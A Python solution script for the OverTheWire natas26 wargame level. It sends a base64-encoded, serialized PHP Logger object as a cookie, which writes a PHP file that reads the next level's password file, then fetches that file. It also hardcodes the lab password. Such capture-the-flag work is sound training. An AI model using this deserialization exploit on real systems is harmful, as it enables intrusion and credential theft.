import sys
import requests as req
import base64
import re

def garbage_to_chr(garbage):
	s = garbage.group()
	s = s[1:]
	s = chr(int(s, 16))
	return s

username = "natas26"
password = "8A506rfIAXbKKk68yJeuTuRq4UfcK70k"
url = "http://%s.natas.labs.overthewire.org/" % username

s = req.session()

# run cookie.php for this

cookie ="Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozODoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvcGFzc3dkMS5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoxNDoiZG9jdG9ybWFydGluNjciO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MzoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9"
data = {"x1": 100, "x2": 200, "y1": 300, "y2": 400}
r = s.get(url, auth=(username, password), cookies={"drawing": cookie})
print(r.text)
print(r.cookies)
print(r.headers)
print(s.proxies)
r = s.get(url + "img/passwd1.php", auth=(username, password))
print(r.text)
